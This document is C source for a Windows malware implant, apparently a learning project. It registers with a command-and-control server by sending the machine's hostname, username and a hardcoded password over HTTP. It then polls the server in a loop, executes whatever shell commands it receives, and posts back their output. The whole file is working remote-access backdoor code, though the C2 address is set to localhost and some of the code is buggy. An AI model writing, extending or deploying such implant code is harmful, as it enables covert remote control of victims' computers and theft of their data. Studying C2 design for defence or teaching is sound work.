#include "httpclient.h"
#include "execute.h"
#include "command.h"
#include "debug.h"

// TODO
// password, c2, port, register, checkin, ua, tls, max failure, sleep time 

#define PASSWORD "1337ch0nkyboy"

#define C2_DOMAIN L"localhost"
#define C2_PORT 5000
#define REGISTER_PATH L"/implant/register"
#define CHECKIN_PATH  L"/implant/checkin"
#define USE_TLS FALSE
#define USER_AGENT L"ch0nky"
#define MAX_ATTEMPT 5
#define SLEEP_TIME 1000

// todo: opcodes
#define OP_EXIT 0
#define OP_EXECUTE 1


RegisterData registerData;
CheckinData checkinData = {0};

BOOL Register(RegisterData *rd){
    DEBUG_PRINTF("Implant Registering\n");
    MakeRegisterData(rd);
    memcpy(rd->Password, PASSWORD, strlen(PASSWORD));
    DEBUG_PRINTF("Register data: %s %s\n", rd->szHostname, rd->szUsername);
    DEBUG_HEX(rd->Guid, sizeof(rd->Guid));
    DEBUG_HEX(rd->Password, sizeof(rd->Password));
    LPBYTE lpOut = NULL;
    SIZE_T stOut = 0;
    lpOut = HTTPRequest(
        L"POST", 
        C2_DOMAIN, 
        REGISTER_PATH, 
        C2_PORT,
        USER_AGENT, 
        (LPBYTE) rd, 
        GetRegisterSize(rd), 
        &stOut, 
        USE_TLS
    );
    if (lpOut == NULL){
        DEBUG_PRINTF("HTTP Request Failed in register\n");
        return FALSE;
    }
    if (stOut ==2){
        if(lpOut[0] == 'o' && lpOut[1] == 'k'){
            free(lpOut);
            return TRUE;
        }
        free(lpOut);
        return FALSE;   
    }
    free(lpOut);
    return FALSE;
}



JobRequest* Checkin(CheckinData *chkin){
    DEBUG_PRINTF("Implant Checkin\n");
    // step 1: make checkin payload
    LPBYTE lpCheckin = NULL;
    LPBYTE lpCheckinNext = NULL;
    SIZE_T stCheckin = sizeof(*chkin);
    lpCheckin = (LPBYTE) malloc(stCheckin );
    if(lpCheckin == NULL){
        return NULL;
    }
    memcpy(lpCheckin, chkin, stCheckin);
    if( chkin->jobResponse != NULL){
        SIZE_T stJobResponse = sizeof(chkin->jobResponse) +chkin->jobResponse->llOut;
        stCheckin += stJobResponse;
        lpCheckinNext = (LPBYTE) realloc(lpCheckin, stCheckin);
        if (lpCheckinNext == NULL){
            free(lpCheckin);
            return NULL;
        }
        lpCheckin = lpCheckinNext;
        lpCheckinNext = NULL;
        memcpy(lpCheckin + sizeof(*chkin),chkin->jobResponse, stJobResponse );

    }
    DEBUG_HEX(lpCheckin, stCheckin);
    DEBUG_PRINTF("Checking in with %zu bytes of data\n", stCheckin);
    LPBYTE lpOut = NULL;
    SIZE_T stOut = 0;
    //todo: what happens if we fail? do we lose the response from the last checkin?
    lpOut = HTTPRequest(
        L"POST", 
        C2_DOMAIN, 
        CHECKIN_PATH, 
        C2_PORT,
        USER_AGENT, 
        lpCheckin, 
        stCheckin, 
        &stOut, 
        USE_TLS
    );
    free(lpCheckin);
    lpCheckin = NULL;
    if(lpOut == NULL){
        return NULL;
    }
    // try to desaizlie the data 
    if( stOut < sizeof(JobRequest)){
        free(lpOut);
        DEBUG_PRINTF("Failed to unpack JobRequest: Payload too small!");
        return NULL;
    }
    //todo: better data validation 
    return  (JobRequest*) lpOut;
}


JobResponse* HandleExecute(JobRequest *jr){
    DEBUG_PRINTF("Handleing Execute Job \n");
    //LPBYTE ExecuteCmd(LPCSTR szCmdline, PSIZE_T stOut);
    JobResponse *lpJobResponse = NULL;
    SIZE_T stOut  = 0;
    LPBYTE lpExecOut = ExecuteCmd(jr->szArgs, &stOut);
    if(lpExecOut == NULL){
        return NULL;
    }
    lpJobResponse =(JobResponse*) malloc(sizeof(JobResponse) + stOut);
    memcpy(lpJobResponse->JobID,jr->JobID, sizeof(jr->JobID) );
    lpJobResponse->llOut = stOut;
    memcpy(lpJobResponse + sizeof(JobResponse),lpExecOut, stOut );
    free(lpExecOut);
    return lpJobResponse;

}


int main(){
    DEBUG_PRINTF("Starting implant\n");
    DWORD dwAttempts = 0;
    JobRequest *jobRequest = NULL;
    JobResponse *jobResponse = NULL;



    while(TRUE){
        if(dwAttempts > MAX_ATTEMPT){
            DEBUG_PRINTF("Failed to reigster!\n");
            exit(0);
        }
        BOOL bResult = Register(&registerData);
        if(bResult){
            DEBUG_PRINTF("Registered!\n");
            break;
        }
        Sleep(SLEEP_TIME);
        dwAttempts ++;

    }
    memcpy(registerData.Guid, checkinData.Guid, sizeof(registerData.Guid));
   
    // checkin loop
    while(TRUE){
        Sleep(SLEEP_TIME);
        // do checkin
        // todo: make sure checkin with response succeeds? 
        checkinData.jobResponse = jobResponse;
        jobRequest = Checkin(&checkinData);
        free(jobResponse);
        jobResponse = NULL;
        if(jobRequest == NULL){
            continue;
        }
        switch (jobRequest->OpCode){
            case (OP_EXIT):
                DEBUG_PRINTF("Oh boy time to leave!\n");
                exit(0);

            case (OP_EXECUTE):
                jobResponse = HandleExecute(jobRequest);
                break;
            default:
                DEBUG_PRINTF("Invalid Op code!\n");
                jobResponse = NULL;
                break;

        }

    }

    return 0;
}